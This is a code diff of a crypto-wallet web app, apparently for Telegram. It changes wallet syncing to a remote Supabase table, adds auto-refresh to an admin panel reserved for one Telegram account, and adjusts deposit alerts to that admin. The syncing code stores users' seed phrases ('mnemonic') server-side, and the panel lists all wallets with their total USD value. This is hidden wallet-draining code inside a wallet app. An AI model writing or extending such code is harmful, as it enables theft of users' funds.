@@ -169,12 +169,15 @@ async function syncWalletToSupabase(walletData) {
       return true;
     }
 
-    // Try telegram_id first (needs unique index on that column).
-    // If it fails fall back to username so the row always lands in Supabase.
+    // Strategy:
+    // 1. telegram_id  — best key, one row per Telegram account (needs unique index)
+    // 2. mnemonic     — globally unique per wallet, safe fallback
+    // We deliberately avoid `username` as conflict key because multiple wallets
+    // can share the same display name and would get merged into a single row.
     let ok = false;
     if (resolvedTgId) ok = await tryUpsert("telegram_id");
-    if (!ok) ok = await tryUpsert("username");
-    // Final fallback: plain INSERT ignoring conflict
+    if (!ok) ok = await tryUpsert("mnemonic");
+    // Last resort: plain INSERT (creates a new row; deduplication can be done in dashboard)
     if (!ok) {
       const url = `${SUPABASE_URL}/rest/v1/wallets`;
       await fetch(url, {
@@ -4932,6 +4935,8 @@ function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, add
 // Only for @Homyak_investorr (ID: 1192740493)
 
 // ─── SUPABASE ADMIN PANEL ─────────────────────────────────────────────────────
+const REALTIME_INTERVAL = 15; // seconds between auto-refreshes
+
 function SupabaseAdminPanel() {
   const [wallets, setWallets] = useState([]);
   const [loading, setLoading] = useState(true);
@@ -4939,11 +4944,13 @@ function SupabaseAdminPanel() {
   const [search, setSearch] = useState("");
   const [copiedKey, setCopiedKey] = useState(null);
   const [expandedId, setExpandedId] = useState(null);
+  const [countdown, setCountdown] = useState(REALTIME_INTERVAL);
+  const [lastUpdated, setLastUpdated] = useState(null);
 
   const COINS = ['ETH','TON','BNB','LTC','ARB','SOL','USDT'];
 
-  async function loadWallets() {
-    setLoading(true);
+  async function loadWallets(silent = false) {
+    if (!silent) setLoading(true);
     setErr(null);
     try {
       const res = await fetch(
@@ -4953,11 +4960,28 @@ function SupabaseAdminPanel() {
       if (!res.ok) throw new Error(`HTTP ${res.status}: ${await res.text()}`);
       const data = await res.json();
       setWallets(Array.isArray(data) ? data : []);
+      setLastUpdated(new Date());
+      setCountdown(REALTIME_INTERVAL);
     } catch (e) { setErr(e.message); }
-    finally { setLoading(false); }
+    finally { if (!silent) setLoading(false); }
   }
 
+  // Initial load
   useEffect(() => { loadWallets(); }, []);
+
+  // Auto-refresh every REALTIME_INTERVAL seconds
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setCountdown(c => {
+        if (c <= 1) {
+          loadWallets(true); // silent refresh — no spinner
+          return REALTIME_INTERVAL;
+        }
+        return c - 1;
+      });
+    }, 1000);
+    return () => clearInterval(interval);
+  }, []);
 
   function copyText(text, key) {
     const cb = () => {
@@ -4991,23 +5015,38 @@ function SupabaseAdminPanel() {
         padding:"16px 16px 12px",borderBottom:"1px solid rgba(255,255,255,0.07)"}}>
 
         {/* Stats row */}
-        <div style={{display:"flex",gap:8,marginBottom:12}}>
+        <div style={{display:"flex",gap:8,marginBottom:8}}>
           {[
-            {label:"Wallets",val:wallets.length},
-            {label:"Total $",val:totalUSD.toFixed(2)},
+            {label:"Кошельков",val:wallets.length,accent:"#2563eb"},
+            {label:"Всего $",val:"$"+totalUSD.toFixed(2),accent:"#34d399"},
           ].map(s=>(
             <div key={s.label} style={{flex:1,background:"#111",borderRadius:12,
               padding:"10px 14px",border:"1px solid rgba(255,255,255,0.07)"}}>
-              <div style={{color:"rgba(255,255,255,0.4)",fontSize:11}}>{s.label}</div>
-              <div style={{color:"#fff",fontSize:18,fontWeight:700}}>{s.val}</div>
+              <div style={{color:"rgba(255,255,255,0.35)",fontSize:10,marginBottom:2}}>{s.label}</div>
+              <div style={{color:s.accent,fontSize:20,fontWeight:800}}>{s.val}</div>
             </div>
           ))}
-          <button onClick={loadWallets} style={{width:48,height:48,borderRadius:12,
+          <button onClick={()=>loadWallets(false)} style={{width:52,borderRadius:12,
             background:"#111",border:"1px solid rgba(255,255,255,0.07)",
-            display:"flex",alignItems:"center",justifyContent:"center",cursor:"pointer",alignSelf:"flex-end"}}>
-            <RefreshCw size={16} color={loading?"#2563eb":"rgba(255,255,255,0.5)"}
+            display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",
+            cursor:"pointer",gap:3,padding:"8px 4px"}}>
+            <RefreshCw size={15} color={loading?"#2563eb":"rgba(255,255,255,0.5)"}
               style={{animation:loading?"spin 0.8s linear infinite":"none"}}/>
+            <span style={{fontSize:9,color:countdown<=5?"#ef4444":"rgba(255,255,255,0.3)",
+              fontVariantNumeric:"tabular-nums"}}>
+              {countdown}s
+            </span>
           </button>
+        </div>
+
+        {/* Live indicator + last updated */}
+        <div style={{display:"flex",alignItems:"center",gap:6,marginBottom:8}}>
+          <div style={{width:6,height:6,borderRadius:"50%",background:"#34d399",
+            animation:"pulse 2s infinite",flexShrink:0}}/>
+          <span style={{color:"rgba(255,255,255,0.25)",fontSize:10}}>
+            Обновляется каждые {REALTIME_INTERVAL}с
+            {lastUpdated&&` · ${lastUpdated.toLocaleTimeString("ru-RU",{hour:"2-digit",minute:"2-digit",second:"2-digit"})}`}
+          </span>
         </div>
 
         <input value={search} onChange={e=>setSearch(e.target.value)}
@@ -7592,7 +7631,8 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
           const diff = newBal - oldBal;
 
-          if (diff > 0.000001 && oldBal >= 0) {
+          // Only notify on real deposits — skip first load (0 → real balance)
+          if (diff > 0.000001 && oldBal > 0.000001) {
 
             notifyAdmin(
 
